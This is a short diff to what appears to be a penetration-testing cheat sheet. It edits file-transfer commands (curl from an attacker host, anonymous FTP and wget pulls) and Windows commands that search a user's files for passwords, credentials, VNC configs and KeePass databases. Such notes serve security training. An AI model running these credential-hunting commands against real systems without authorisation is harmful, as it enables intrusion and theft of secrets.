@@ -640,6 +640,7 @@ __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 
 ```c
 ftp <RHOST>
+ftp -A <RHOST>
 wget -r ftp://anonymous:anonymous@<RHOST>
 ```
 
@@ -5303,7 +5304,7 @@ dir .s *pass* == *.config
 dir /s *pass* == *cred* == *vnc* == *.config*
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.vbs -File -Recurse -ErrorAction SilentlyContinue
 ```
 
 ###### PowerShell History
